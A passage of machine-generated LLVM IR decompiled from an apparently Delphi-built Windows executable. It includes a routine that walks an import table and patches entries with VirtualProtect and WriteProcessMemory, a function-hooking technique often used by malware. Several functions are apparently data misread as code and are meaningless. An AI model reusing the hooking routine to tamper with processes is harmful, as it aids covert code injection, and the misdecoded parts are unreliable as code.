  %18 = sdiv i32 %sext, 16777216, !insn.addr !1998
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_407773

dec_label_pc_407773:                              ; preds = %dec_label_pc_407773.lr.ph, %dec_label_pc_4077d7
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !1999
  %24 = add i32 %esp.17.reload, -4, !insn.addr !2000
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2000
  store i32 %18, i32* %25, align 4, !insn.addr !2000
  %26 = add i32 %esp.17.reload, -8, !insn.addr !2001
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2001
  store i32 %23, i32* %27, align 4, !insn.addr !2001
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2002
  %29 = icmp eq i32 %28, 0, !insn.addr !2003
  %30 = icmp eq i1 %29, false, !insn.addr !2004
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2004
  br i1 %30, label %dec_label_pc_4077d7, label %dec_label_pc_407786, !insn.addr !2004

dec_label_pc_407786:                              ; preds = %dec_label_pc_407773
  %31 = add i32 %esi.08.reload, 16, !insn.addr !2005
  %32 = inttoptr i32 %31 to i32*, !insn.addr !2005
  %33 = load i32, i32* %32, align 4, !insn.addr !2005
  %34 = add i32 %33, %arg1, !insn.addr !2006
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2007
  %36 = load i32, i32* %35, align 4, !insn.addr !2007
  %37 = icmp eq i32 %36, 0, !insn.addr !2008
  %38 = icmp eq i1 %37, false, !insn.addr !2009
  store i32 %36, i32* %.reg2mem14, !insn.addr !2009
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !2009
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2009
  br i1 %38, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !2009

dec_label_pc_40778e:                              ; preds = %dec_label_pc_407786, %dec_label_pc_4077ce
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !2010
  %40 = icmp eq i1 %39, false, !insn.addr !2011
  br i1 %40, label %dec_label_pc_4077ce, label %dec_label_pc_407793, !insn.addr !2011

dec_label_pc_407793:                              ; preds = %dec_label_pc_40778e
  %41 = add i32 %esp.17.reload, -12, !insn.addr !2012
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2012
  store i32 %20, i32* %42, align 4, !insn.addr !2012
  %43 = add i32 %esp.17.reload, -16, !insn.addr !2013
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2013
  store i32 128, i32* %44, align 4, !insn.addr !2013
  %45 = add i32 %esp.17.reload, -20, !insn.addr !2014
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2014
  store i32 4, i32* %46, align 4, !insn.addr !2014
  %47 = add i32 %esp.17.reload, -24, !insn.addr !2015
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2015
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !2015
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2016
  %50 = add i32 %esp.17.reload, -28, !insn.addr !2017
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2017
  store i32 %21, i32* %51, align 4, !insn.addr !2017
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2018
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2018
  store i32 4, i32* %53, align 4, !insn.addr !2018
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2019
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2019
  store i32 %22, i32* %55, align 4, !insn.addr !2019
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2020
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2020
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2020
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2021
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2021
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2022
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2022
  store i32 %59, i32* %61, align 4, !insn.addr !2022
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2023
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2024
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2024
  store i32 %21, i32* %64, align 4, !insn.addr !2024
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2025
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2026
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2026
  store i32 %65, i32* %67, align 4, !insn.addr !2026
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2027
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2027
  store i32 4, i32* %69, align 4, !insn.addr !2027
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2028
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2028
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2028
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2029
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2030
  br label %dec_label_pc_4077d7, !insn.addr !2030

dec_label_pc_4077ce:                              ; preds = %dec_label_pc_40778e
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2031
  %74 = inttoptr i32 %73 to i32*, !insn.addr !2007
  %75 = load i32, i32* %74, align 4, !insn.addr !2007
  %76 = icmp eq i32 %75, 0, !insn.addr !2008
  %77 = icmp eq i1 %76, false, !insn.addr !2009
  store i32 %75, i32* %.reg2mem14, !insn.addr !2009
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !2009
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2009
  br i1 %77, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !2009

dec_label_pc_4077d7:                              ; preds = %dec_label_pc_4077ce, %dec_label_pc_407786, %dec_label_pc_407793, %dec_label_pc_407773
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2032
  %79 = add i32 %esi.08.reload, 32, !insn.addr !1995
  %80 = inttoptr i32 %79 to i32*, !insn.addr !1995
  %81 = load i32, i32* %80, align 4, !insn.addr !1995
  %82 = icmp eq i32 %81, 0, !insn.addr !1996
  %83 = icmp eq i1 %82, false, !insn.addr !1997
  store i32 %81, i32* %.reg2mem, !insn.addr !1997
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !1997
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !1997
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !1997
  br i1 %83, label %dec_label_pc_407773, label %dec_label_pc_4077e1, !insn.addr !1997

dec_label_pc_4077e1:                              ; preds = %dec_label_pc_4077d7, %dec_label_pc_4077da.preheader, %dec_label_pc_40775a, %dec_label_pc_407734
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2033
}

define i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4077ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2034
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2034
  %3 = load i32, i32* %2, align 4, !insn.addr !2034
  ret i32 %3, !insn.addr !2035
}

define i32 @function_4077f0() local_unnamed_addr {
dec_label_pc_4077f0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2036
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2036
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2036
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2037
  %2 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2038
  %3 = add i32 %2, 1, !insn.addr !2038
  store i32 %3, i32* @global_var_4096f0, align 4, !insn.addr !2038
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2039
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2040
  ret i32 0, !insn.addr !2041
}

define i32 @function_407815() local_unnamed_addr {
dec_label_pc_407815:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2042
  ret i32 %0, !insn.addr !2042
}

define i32 @function_40781a() local_unnamed_addr {
dec_label_pc_40781a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2043
}

define i32 @function_40781c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40781c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2044
}

define i32 @function_407820() local_unnamed_addr {
dec_label_pc_407820:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2045
  %2 = add i32 %1, -1, !insn.addr !2045
  store i32 %2, i32* @global_var_4096f0, align 4, !insn.addr !2045
  ret i32 %0, !insn.addr !2046
}

define i32 @function_407828(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407828:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_4077ec(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2047
  ret i32 %3, !insn.addr !2048
}

define i32 @function_407874(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407874:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2049
  %2 = icmp eq i1 %1, false, !insn.addr !2050
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_4077ec(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2051
  ret i32 %3, !insn.addr !2052
}

define i32 @function_4078a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4078a4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2053
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2053
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2053
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2054
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2055
  %3 = call i32 @"@LStrPos"(), !insn.addr !2056
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2057
  %6 = call i32 @"@LStrPos"(), !insn.addr !2058
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %8 = call i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2059
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2060
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2061
  ret i32 %9, !insn.addr !2062
}

define i32 @function_40793c() local_unnamed_addr {
dec_label_pc_40793c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2063
  ret i32 %0, !insn.addr !2063
}

define i32 @function_407941() local_unnamed_addr {
dec_label_pc_407941:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2064
}

define i32 @function_407943(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407943:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2065
}

define i32 @function_407953() local_unnamed_addr {
dec_label_pc_407953:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2066
}

define i32 @function_4079a0() local_unnamed_addr {
dec_label_pc_4079a0:
  %0 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a1c, i32 0, i32 0), i32 4225064), !insn.addr !2067
  store i32 %0, i32* @global_var_40810c, align 4, !insn.addr !2068
  %1 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a38, i32 0, i32 0), i32 4225140), !insn.addr !2069
  store i32 %1, i32* @global_var_408110, align 4, !insn.addr !2070
  %2 = call i32 @function_407660(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a50, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_407a5c, i32 0, i32 0), i32 4225188), !insn.addr !2071
  store i32 %2, i32* @global_var_408114, align 4, !insn.addr !2072
  ret i32 %2, !insn.addr !2073
}

define i32 @function_407a10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_407a10:
  %merge.reg2mem = alloca i32, !insn.addr !2074
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2074
  br i1 %10, label %dec_label_pc_407a3f, label %dec_label_pc_407a12, !insn.addr !2074

dec_label_pc_407a12:                              ; preds = %dec_label_pc_407a10
  br i1 %8, label %dec_label_pc_407a48, label %dec_label_pc_407a15, !insn.addr !2075

dec_label_pc_407a15:                              ; preds = %dec_label_pc_407a12
  %11 = trunc i32 %4 to i16, !insn.addr !2076
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2076
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2076
  store i8 %12, i8* %13, align 1, !insn.addr !2076
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2077
  store i8 %14, i8* %13, align 1, !insn.addr !2077
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2078
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2078
  %19 = add i8 %16, %18, !insn.addr !2078
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2078
  store i8 %19, i8* %20, align 1, !insn.addr !2078
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2079
  %21 = trunc i32 %arg10 to i16, !insn.addr !2080
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2080
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2080
  store i32 %22, i32* %23, align 4, !insn.addr !2080
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2081
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2082
  %25 = load i8, i8* %24, align 1, !insn.addr !2082
  %26 = trunc i32 %arg1 to i8, !insn.addr !2082
  %27 = add i8 %25, %26, !insn.addr !2082
  store i8 %27, i8* %24, align 1, !insn.addr !2082
  %28 = trunc i32 %arg3 to i16, !insn.addr !2083
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2083
  %30 = load i32, i32* %29, align 4, !insn.addr !2083
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2083
  %31 = add i32 %arg5, 67, !insn.addr !2084
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2084
  %34 = load i32, i32* %33, align 4, !insn.addr !2084
  %35 = load i8, i8* %24, align 1, !insn.addr !2085
  %36 = add i8 %35, %26, !insn.addr !2085
  store i8 %36, i8* %24, align 1, !insn.addr !2085
  %37 = mul i32 %34, 1557718248, !insn.addr !2086
  %38 = add i32 %arg7, 97, !insn.addr !2086
  %39 = add i32 %38, %37, !insn.addr !2086
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2086
  %41 = load i8, i8* %40, align 1, !insn.addr !2086
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2086
  %44 = add i8 %43, %41, !insn.addr !2086
  %45 = icmp eq i8 %44, 0, !insn.addr !2086
  store i8 %44, i8* %40, align 1, !insn.addr !2086
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2087
  br i1 %45, label %dec_label_pc_407ab1, label %dec_label_pc_407a3f, !insn.addr !2087

dec_label_pc_407a3f:                              ; preds = %dec_label_pc_407a10, %dec_label_pc_407a15
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2088

dec_label_pc_407a48:                              ; preds = %dec_label_pc_407a12
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2089
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2089
  store i8 %48, i8* %49, align 1, !insn.addr !2089
  %50 = add i32 %3, 104, !insn.addr !2090
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2090
  %52 = load i8, i8* %51, align 1, !insn.addr !2090
  %53 = udiv i32 %4, 256, !insn.addr !2090
  %54 = trunc i32 %53 to i8, !insn.addr !2090
  %55 = add i8 %52, %54, !insn.addr !2090
  store i8 %55, i8* %51, align 1, !insn.addr !2090
  %56 = trunc i32 %4 to i16, !insn.addr !2091
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2091
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2091
  store i8 %57, i8* %58, align 1, !insn.addr !2091
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2092
  store i8 %59, i8* %58, align 1, !insn.addr !2092
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2093
  store i8 %60, i8* %58, align 1, !insn.addr !2093
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2094
  store i8 %61, i8* %58, align 1, !insn.addr !2094
  %62 = load i8, i8* %51, align 1, !insn.addr !2095
  %63 = trunc i32 %4 to i8, !insn.addr !2095
  %64 = add i8 %62, %63, !insn.addr !2095
  store i8 %64, i8* %51, align 1, !insn.addr !2095
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2096
  store i8 %65, i8* %58, align 1, !insn.addr !2096
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2097
  store i8 %66, i8* %58, align 1, !insn.addr !2097
  %67 = add i32 %2, 1, !insn.addr !2098
  %68 = icmp slt i32 %67, 0, !insn.addr !2098
  br i1 %68, label %dec_label_pc_407ac9, label %dec_label_pc_407a64, !insn.addr !2099

dec_label_pc_407a64:                              ; preds = %dec_label_pc_407a48
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2100
  %72 = xor i32 %4, %1, !insn.addr !2101
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2102
  %75 = inttoptr i32 %74 to i16*, !insn.addr !2102
  %76 = load i16, i16* %75, align 2, !insn.addr !2102
  %77 = trunc i32 %72 to i16, !insn.addr !2102
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2102
  %78 = load i8, i8* %73, align 4, !insn.addr !2103
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2103
  %81 = add i8 %78, %80, !insn.addr !2103
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2103
  store i8 %81, i8* %82, align 1, !insn.addr !2103
  %83 = add i32 %71, 82, !insn.addr !2104
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2104
  %85 = load i8, i8* %84, align 1, !insn.addr !2104
  %86 = add i8 %85, %63, !insn.addr !2104
  store i8 %86, i8* %84, align 1, !insn.addr !2104
  %87 = load i32, i32* %eax, align 4, !insn.addr !2105
  %88 = add i32 %87, -1, !insn.addr !2105
  %89 = add i32 %71, 4227341, !insn.addr !2106
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2106
  %91 = load i8, i8* %90, align 1, !insn.addr !2106
  %92 = udiv i32 %88, 256, !insn.addr !2106
  %93 = trunc i32 %92 to i8, !insn.addr !2106
  %94 = add i8 %91, %93, !insn.addr !2106
  store i8 %94, i8* %90, align 1, !insn.addr !2106
  ret i32 %88, !insn.addr !2106

dec_label_pc_407ab1:                              ; preds = %dec_label_pc_407a15
  %95 = add i32 %46, 1, !insn.addr !2107
  store i32 %95, i32* %eax, align 4, !insn.addr !2107
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2108
  %97 = load i8, i8* %96, align 1, !insn.addr !2108
  %98 = udiv i32 %arg3, 256, !insn.addr !2108
  %99 = trunc i32 %98 to i8, !insn.addr !2108
  %100 = add i8 %97, %99, !insn.addr !2108
  store i8 %100, i8* %96, align 1, !insn.addr !2108
  %101 = add i32 %arg3, 89, !insn.addr !2109
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2109
  store i8 -1, i8* %102, align 1, !insn.addr !2109
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2110
  %103 = load i32, i32* %eax, align 4, !insn.addr !2111
  ret i32 %103, !insn.addr !2111

dec_label_pc_407ac9:                              ; preds = %dec_label_pc_407a48
  %104 = load i32, i32* %eax, align 4, !insn.addr !2112
  ret i32 %104, !insn.addr !2112
}

define i32 @function_407acc() local_unnamed_addr {
dec_label_pc_407acc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2113
  %2 = add i32 %1, -1, !insn.addr !2113
  store i32 %2, i32* @global_var_4096f4, align 4, !insn.addr !2113
  ret i32 %0, !insn.addr !2114
}

define i32 @function_407ad4() local_unnamed_addr {
dec_label_pc_407ad4:
  %0 = call i32 @"@LStrAsg"(), !insn.addr !2115
  ret i32 %0, !insn.addr !2116
}

define i32 @function_407aeb() local_unnamed_addr {
dec_label_pc_407aeb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2117
}

define i32 @function_407aed(i32 %arg1) local_unnamed_addr {
dec_label_pc_407aed:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !2118
  %7 = inttoptr i32 %4 to i8*, !insn.addr !2118
  store i8 %6, i8* %7, align 1, !insn.addr !2118
  %8 = add i32 %2, 107, !insn.addr !2119
  %9 = inttoptr i32 %8 to i8*, !insn.addr !2119
  %10 = load i8, i8* %9, align 1, !insn.addr !2119
  %11 = udiv i32 %3, 256, !insn.addr !2119
  %12 = trunc i32 %11 to i8, !insn.addr !2119
  %13 = add i8 %10, %12, !insn.addr !2119
  %14 = icmp ult i8 %13, %10, !insn.addr !2119
  store i8 %13, i8* %9, align 1, !insn.addr !2119
  br i1 %14, label %dec_label_pc_407b5c, label %dec_label_pc_407afe, !insn.addr !2120

dec_label_pc_407afe:                              ; preds = %dec_label_pc_407aed
  %15 = icmp eq i8 %13, 0, !insn.addr !2119
  br i1 %15, label %dec_label_pc_407b04, label %dec_label_pc_407b65, !insn.addr !2121

dec_label_pc_407b04:                              ; preds = %dec_label_pc_407afe
  %16 = trunc i32 %3 to i16, !insn.addr !2122
  %17 = call i8 @__asm_insb(i16 %16), !insn.addr !2122
  %18 = inttoptr i32 %0 to i8*, !insn.addr !2122
  store i8 %17, i8* %18, align 1, !insn.addr !2122
  %19 = add i32 %1, -117, !insn.addr !2123
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2123
  %21 = load i8, i8* %20, align 1, !insn.addr !2123
  %22 = trunc i32 %3 to i8, !insn.addr !2123
  %23 = add i8 %21, %22, !insn.addr !2123
  store i8 %23, i8* %20, align 1, !insn.addr !2123
  %24 = call i8 @__asm_in(i16 %16), !insn.addr !2124
  %25 = call i32 @__readfsdword(i32 0), !insn.addr !2125
  store i32 %25, i32* %stack_var_-24, align 4, !insn.addr !2125
  %26 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !2125
  call void @__writefsdword(i32 0, i32 %26), !insn.addr !2126
  %27 = load i32, i32* @global_var_4096f8, align 4, !insn.addr !2127
  %28 = add i32 %27, 1, !insn.addr !2127
  store i32 %28, i32* @global_var_4096f8, align 4, !insn.addr !2127
  %29 = load i32, i32* %stack_var_-24, align 4, !insn.addr !2128
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !2129
  ret i32 0, !insn.addr !2130

dec_label_pc_407b5c:                              ; preds = %dec_label_pc_407aed
  ret i32 %4, !insn.addr !2131

dec_label_pc_407b65:                              ; preds = %dec_label_pc_407afe
  %30 = call i32 @function_407ad4(), !insn.addr !2132
  ret i32 ptrtoint (i32* @global_var_4096fc to i32), !insn.addr !2133
}

define i32 @function_407b8f() local_unnamed_addr {
dec_label_pc_407b8f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2134
  ret i32 %0, !insn.addr !2134
}

define i32 @function_407b94() local_unnamed_addr {
dec_label_pc_407b94:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2135
}

define i32 @function_407b96(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_407b96:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2136
}

define i32 @function_407b9c() local_unnamed_addr {
dec_label_pc_407b9c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2137
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407bc7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2138
  ret i32 %0, !insn.addr !2138
}

define i32 @function_407bcc() local_unnamed_addr {
dec_label_pc_407bcc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2139
}

define i32 @function_407bce(i32 %arg1) local_unnamed_addr {
dec_label_pc_407bce:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2140
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407cd0:
  %esp.2.reg2mem = alloca i32, !insn.addr !2141
  %esp.1.reg2mem = alloca i32, !insn.addr !2141
  %esp.0.reg2mem = alloca i32, !insn.addr !2141
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2142
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2143
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2143
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2143
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2144
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2145
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_409700 to i8*), i32 0), !insn.addr !2146
  %5 = add i32 %4, ptrtoint (i8** @global_var_409700 to i32), !insn.addr !2147
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2147
  store i8 0, i8* %6, align 1, !insn.addr !2147
  %7 = call i32 @"@LStrAsg"(), !insn.addr !2148
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !2149
  %9 = call i32 @function_40708c(), !insn.addr !2150
  %10 = call i32 @"@LStrAsg"(), !insn.addr !2151
  %11 = call i32 @function_407104(), !insn.addr !2152
  %12 = trunc i32 %11 to i8, !insn.addr !2153
  %13 = icmp eq i8 %12, 0, !insn.addr !2153
  br i1 %13, label %dec_label_pc_407de7, label %dec_label_pc_407d6c, !insn.addr !2154

dec_label_pc_407d6c:                              ; preds = %dec_label_pc_407cd0
  %14 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2155
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2156
  store i32 -1, i32* %15, align 4, !insn.addr !2156
  %16 = call i32 @"@LStrFromArray"(), !insn.addr !2157
  %17 = call i32 @function_4070cc(), !insn.addr !2158
  %18 = call i32 @"@LStrAsg"(), !insn.addr !2159
  %19 = call i32 @"@LStrCat3"(), !insn.addr !2160
